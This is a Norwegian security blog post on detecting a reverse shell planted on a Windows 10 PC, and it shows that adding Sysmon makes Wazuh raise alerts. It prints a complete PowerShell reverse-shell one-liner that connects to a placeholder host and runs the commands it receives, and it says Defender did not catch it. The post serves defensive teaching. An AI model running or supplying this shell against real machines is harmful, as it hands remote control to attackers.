---
tittel: Oppdage skurker i maskinen
beskrivelse: Skurkene har hacket en maskin på nettet. Hvordan kan vi oppdage dem?
tags: 
 - post
date: 2023-09-04
bilde: /img/nettverksrot.jpg
layout: layouts/post.njk
---
# En Windows-PC blir hacket
Scenario: en hacker har overbevist en medarbeider om å kjøre et script i Powershell. Dette gir hackeren et 
reversskall, altså et kommandolinjevindo til å direkte kontrollere maskinen. Hackeren benytter muligheten til å 
legge inn oppstart av reversskallet som en planlagt oppgave i Windows (Schtasks) som kjører hver gang 
maskinen starter opp. 

Hvordan kan vi oppdage dette? Et godt antivirusprogram skulle man jo tro skulle blokkere dette, men 
det er fullt mulig å få til dette uten at det oppdages. Dersom, for eksempel, Windows PC-en 
kjører Windows 10 med innebygd Windows Defender som sikkerhetsløsning, blir følgende reversskall 
for eksempel ikke detektert: 

```
$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Dette ble testet på en Win10-maskin som kjører på Amazon Workspaces, og monitorert med en 
Wazuh-agent uten endringer i konfigurasjon fra standard. 

## Enkel forbedring
Ved ganske enkelt å installere [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) med
konfig-fila fra [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config), blir situasjonen 
en annen. Wazuh fyrer opp med alerts, og vi oppdager hva skurkene har fore. 

![Alarmer etter sysmon ble installert](/img/alerts_after_sysmon.png)

## Take-away
- Ikke stol på sikkerhetsverktøy uten å teste og tilpasse dem
- Bruk verktøy som øker synligheten av mistenkelig aktivitet
- Tenk gjennom hvilke ekstra deteksjoner du har bruk for
